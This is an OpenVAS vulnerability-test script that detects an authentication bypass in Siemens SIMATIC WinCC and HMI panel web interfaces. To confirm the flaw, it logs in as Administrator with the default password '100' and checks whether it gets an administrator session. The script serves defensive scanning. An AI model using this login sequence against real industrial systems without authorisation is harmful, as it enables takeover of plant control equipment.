###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_Siemens_SIMATIC_51177.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Multiple Siemens SIMATIC Products Authentication Bypass Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Multiple Siemens SIMATIC products are affected by vulnerabilities that
allow attackers to bypass authentication.

An attacker can exploit these issues to bypass intended security
restrictions and gain access to the affected application. Successfully
exploiting these issues may lead to further attacks.

The following products are affected:

SIMATIC WinCC Flexible 2004 through 2008 SP2 SIMATIC WinCC V11,
V11 SP1, and V11 SP2 SIMATIC HMI TP, OP, MP, Mobile, and Comfort
Series Panels";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103372");
 script_bugtraq_id(51177);
 script_cve_id("CVE-2011-4508","CVE-2011-4509");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version("$Revision: 9351 $");

 script_name("Multiple Siemens SIMATIC Products Authentication Bypass Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51177");
 script_xref(name : "URL" , value : "http://www.automation.siemens.com/mcms/human-machine-interface/en/visualization-software/Pages/Default.aspx");
 script_xref(name : "URL" , value : "http://www.automation.siemens.com/mcms/human-machine-interface/en/visualization-software/wincc-flexible/wincc-flexible-runtime/user-interface/pages/default.aspx");
 script_xref(name : "URL" , value : "http://xs-sniper.com/blog/2011/12/20/the-siemens-simatic-remote-authentication-bypass-that-doesnt-exist/");
 script_xref(name : "URL" , value : "http://www.us-cert.gov/control_systems/pdf/ICSA-11-356-01.pdf");

 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-12-23 10:42:29 +0100 (Fri, 23 Dec 2011)");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

dirs = make_list("/","/www/");
host = get_host_name();

foreach dir (dirs) {

  url = string(dir,"start.html");
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if( buf == NULL ) continue;

  if("miniweb" >< tolower(buf)) {

     req = string(
		  "POST ",dir,"FormLogin HTTP/1.1\r\n",
		  "Host: ",host,"\r\n",
		  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
		  "Accept-Encoding: gzip, deflate\r\n",
		  "DNT: 1\r\n",
		  "Referer: http://",host,"/start.html\r\n",
		  "Content-Type: application/x-www-form-urlencoded\r\n",
		  "Content-Length: 58\r\n",
		  "\r\n",
		  "Login=Administrator&Redirection=%2Fstart.html&Password=100\r\n\r\n");

     result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

     if("Auth Form Response" >< result) {

       start = eregmatch(string:result, pattern:'url=([^"]+)');
       if(isnull(start[1]))continue;

       co = eregmatch(string:result, pattern:"Set-cookie: ([^,]+)");
       if(isnull(co[1]))continue;

       cookie = co[1];
       url = string(start[1]);

       req = string("GET ", url, " HTTP/1.1\r\n",
		    "Host: ",host,"\r\n",
		    "Cookie: ",cookie," path=/\r\n",
		    "\r\n");

       buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
       if( buf == NULL ) continue;

       if("You are logged in" >< buf && "Welcome Administrator" >< buf) {

	 security_message(port:port);
	 exit(0);

        }	 
     }  
  }   
}

exit(0);
